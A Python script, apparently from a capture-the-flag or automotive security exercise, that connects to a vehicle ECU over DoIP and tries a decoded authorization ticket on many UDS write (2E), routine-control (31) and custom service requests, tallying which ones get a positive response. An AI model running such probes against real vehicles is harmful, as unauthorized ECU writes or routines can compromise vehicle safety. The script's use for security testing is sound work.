import sys, base64, struct
sys.path.insert(0,"04_SOLVE/uds")
from doip import DoIP, explain
TICKET_B64="3I-tVCsWTfSqqZE-ZrqsQgAAAABq98emLAlQ9atV-YO71pCxdYJwcA"
ticket=base64.urlsafe_b64decode(TICKET_B64+"="*(-len(TICKET_B64)%4))

def run(reqs, tag):
    d=DoIP(); d.connect(); d.routing_activation()
    d.uds(0xE442, bytes.fromhex("1003"), wait=0.6)
    out=[]
    for label,data in reqs:
        x=d.parse_uds(d.uds(0xE442, data, wait=1.0))
        s = f"src={x[0]['src']} {explain(x[0]['uds'])}" if x else "EMPTY"
        out.append((label,s))
        if x and "7e" not in x[0]['uds'][-2:] and "31" not in x[0]['uds'][-2:]:
            print(f"  *** {label:30s} {s}")
    d.close()
    from collections import Counter
    c=Counter(s for _,s in out)
    print(f"[{tag}] {len(out)} reqs; distinct responses:")
    for k,v in c.most_common(10): print(f"    {v:4d}x {k}")

# 2E with ticket on candidate DIDs
dids=["F1A3","F190","F1A0","F1A8","0000","0001","0100","0200","F100","F1FF","E000","C000"]
run([(f"2E {did} +ticket", bytes.fromhex("2E"+did)+ticket) for did in dids], "2E+ticket")

# 31 with ticket
sids=["FF00","FF01","0200","0201","E000"]
run([(f"31 01 {r} +ticket", bytes.fromhex("3101"+r)+ticket) for r in sids], "31+ticket")

# raw ticket as whole UDS
run([("bare ticket", ticket)], "bare")
# ticket with 0xBA / custom
run([("BA +ticket", bytes([0xBA])+ticket), ("C0 +ticket", bytes([0xC0])+ticket),
     ("2F +ticket", bytes([0x2F])+ticket)], "custom")
